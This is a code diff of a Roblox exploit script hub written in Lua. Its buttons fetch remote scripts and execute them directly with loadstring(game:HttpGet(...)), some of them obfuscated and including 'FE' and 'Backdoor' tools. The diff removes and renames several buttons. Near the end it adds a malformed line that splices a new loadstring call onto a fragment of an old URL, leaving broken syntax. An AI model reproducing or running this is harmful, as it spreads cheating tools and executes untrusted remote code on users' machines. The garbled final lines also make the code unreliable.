@@ -166,14 +166,7 @@ UniversalTab:AddButton({
 })
 
 UniversalTab:AddButton({
-	Name = "Rochips Panel V6.0",
-	Callback = function()
-      		
-  	end    
-})
-
-UniversalTab:AddButton({
-	Name = "Rochips Panel",
+	Name = "Roblox RochipsPanel V6.0",
 	Callback = function()
       		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Rochips-Panel-V6-15097"))()
   	end    
@@ -255,16 +248,6 @@ FeTab:AddButton({
 	Callback = function()
       		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
   	end    
-	Name = "MiniGun",
-	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Minigun"))()
-  	end    
-
-FeTab:AddButton({
-	Name = "Genesis Fe Script Hub",
-	Callback = function()
-      	 loadstring(game:HttpGet("https://raw.githubusercontent.com/RScripter/-ECAX-HUB-/main/Genesis%20Fe"))()
-  	end    
 })
 
 -- Tab : Nerd
@@ -320,5 +303,7 @@ Backdoor:AddButton({
 	Name = "Lalol Hub",
 	Callback = function()
       		loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+  	end    
+})loadstring(game:HttpGet("https://raw.githubusercontent.com/RScripter/Scripts/main/%E2%80%A2ECAX%20HUB%E2%80%A2%20VERSION%201%20UPDATE%202"))()-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
   	end    
 })
